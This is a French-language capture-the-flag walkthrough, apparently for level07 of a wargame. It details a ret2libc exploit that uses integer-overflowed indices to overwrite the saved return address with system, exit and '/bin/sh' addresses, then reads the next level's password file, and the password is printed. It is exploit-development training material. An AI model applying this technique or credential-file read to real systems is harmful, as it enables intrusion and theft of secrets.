@@ -1,0 +1,68 @@
+Idee : Ecriture dans le buffer pile sur la return addresse
+Utilisation de la ret2libc sur l'adresse de retour du main.
+
+
+info proc map : 
+find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
+
+BASH 0xf7f897ec
+1 pattern found.
+
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+→ \xd0\xae\xe6\xf7
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
+→ \x70\xeb\xe5\xf7
+
+system + exit + /bin/bash
+→ \xd0\xae\xe6\xf7 + \x70\xeb\xe5\xf7 + \xec\x97\xf8\xf7
+
+Retrouver l’adresse du debut du buffer sur la stack
+on store 1111 a l’index 1, 2222 a 2, 3333 a 4 et 4444 a 5
+(gdb) x/100d $sp-0
+0xffffd528:	-134415680	-134363372	152	-1
+0xffffd538:	-10244	 -10328	0	0 → debut du buffer a l’index 0
+0xffffd548:	1111	2222	0	3333
+0xffffd558:	4444	0	0	0
+
+addresse = 0xffffd538 + 12bytes = FFFFD544 = 4294956356
+
+https://visualgdb.com/gdbreference/commands/info_frame
+recherche de l’overflow
+Breakpoint 1, 0x080489f1 in main () → breakpoint sur le return
+(gdb) info frame
+Stack level 0, frame at 0xffffd710:
+ eip = 0x80489f1 in main; saved eip 0xf7e45513
+ Arglist at unknown address.
+ Locals at unknown address, Previous frame's sp is 0xffffd710
+ Saved registers:
+  eip at 0xffffd70c → 4294956812
+4294956812 - 4294956356 = 456 octet → 456/4 = 114 car index en int
+114 = -2147483534
+116 = -2147483532
+
+
+
+
+114 = -2147483534 → 4159090384 adresse de system en int
+115 →4159040368 adresse de exit en int
+116 = -2147483532 → 4160264172 adresse de /bin/bash en int
+
+Input command: store
+ Number: 4159090384
+ Index: -2147483534
+ Completed store command successfully
+Input command: store
+ Number: 4159040368
+ Index: 115
+ Completed store command successfully
+Input command: store
+ Number: 4160264172
+ Index: -2147483532
+ Completed store command successfully
+Input command: quit
+
+cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+
